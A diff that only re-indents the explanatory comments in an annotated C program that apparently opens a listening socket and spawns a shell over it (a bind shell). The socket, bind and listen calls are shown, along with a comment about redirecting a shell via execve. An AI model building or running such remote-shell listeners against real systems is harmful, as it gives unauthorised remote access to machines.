@@ -35,30 +35,30 @@ int main(void) {
 		function calls that operate on sockets.
 
 		#include <sys/socket.h>
-    int socket(int domain, int type, int protocol);
+    		int socket(int domain, int type, int protocol);
 	**/
 	socketC = socket(AF_INET, SOCK_STREAM, 0);
 
 	/**
-	  bind - bind a name to a socket
-	  The bind() function shall assign a local socket address address
-	  to a socket identified by descriptor socket that has no local 
+	  	bind - bind a name to a socket
+	  	The bind() function shall assign a local socket address address
+	  	to a socket identified by descriptor socket that has no local 
 		socket address assigned. Sockets created with the socket() function 
 		are initially unnamed; they are identified only by their address family.
 
-    #include <sys/socket.h>
-    int bind(int socket, const struct sockaddr *address, socklen_t address_len);
+    		#include <sys/socket.h>
+    		int bind(int socket, const struct sockaddr *address, socklen_t address_len);
 
 	**/
 	bind(socketC, (struct sockaddr *)&sin, sizeof(sin));
 	
 	/**
-	  listen - listen for socket connections and limit 
+	  	listen - listen for socket connections and limit 
 		the queue of incoming connection		
-	  The listen() function shall mark a connection-mode socket, specified by the socket argument, as accepting connections.
+	  	The listen() function shall mark a connection-mode socket, specified by the socket argument, as accepting connections.
 
-    #include <sys/socket.h>
-    int listen(int socket, int backlog);
+	  	#include <sys/socket.h>
+    		int listen(int socket, int backlog);
 
 	**/
 	listen(socketC, 5);
@@ -94,8 +94,8 @@ int main(void) {
 	/**
 		execve - execute program
 
-    #include <unistd.h>
-	  int execve(const char *filename, char *const argv[], char *const envp[]);
+    		#include <unistd.h>
+	  	int execve(const char *filename, char *const argv[], char *const envp[]);
 
 	**/
 	//because we are redirect the output of the connection, when we execute it, we are redirecting a shell 
